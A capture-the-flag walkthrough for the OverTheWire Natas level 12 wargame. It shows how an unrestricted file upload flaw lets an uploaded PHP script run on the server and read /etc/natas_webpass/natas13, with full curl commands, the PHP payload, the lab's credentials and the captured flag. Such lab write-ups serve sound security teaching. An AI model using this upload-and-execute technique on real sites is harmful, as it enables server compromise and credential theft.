# Natas12

*	user: `natas12`
*	pass: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
*	url: `http://natas12.natas.labs.overthewire.org`
*	flag: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

## Procedure

1.	This level allows images, or better, files upload and provides a
	link to them. By taking a look in the source code, it's possible to
	understand how the destination path is generated. In few words,
	uploaded files will be available at

		/upload/<random string>.<extension>

2.	While `<random string>` is random, `<extension>` is determined from
	the form's hidden field `filename`. So, let's try to verify it.
	Create a file called `image.php` and upload it

		$ echo "<?php phpinfo(); ?>" >  image.php
		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas12</h1>
		<div id="content">
		The file <a href="upload/dlqovjn3kh.php">upload/dlqovjn3kh.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

3.	Well. It seems to work. Let's try if [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
	vulnerability is exploitable. If true, by clicking on

		http://natas12.natas.labs.overthewire.org/upload/dlqovjn3kh.php

	we should see the standard `phpinfo()` page. Of course, it works!

4.	Let's try to access the file `/etc/natas_webpass/natas13`. Modify
	`image.php` with the following content

		<?php
			$p = file_get_contents("/etc/natas_webpass/natas13");
			echo $p;
		?>

	and upload it

		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas12</h1>
		<div id="content">
		The file <a href="upload/r0qf78xvfq.php">upload/r0qf78xvfq.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	Now, let's try to execute our script

		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/r0qf78xvfq.php
		jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
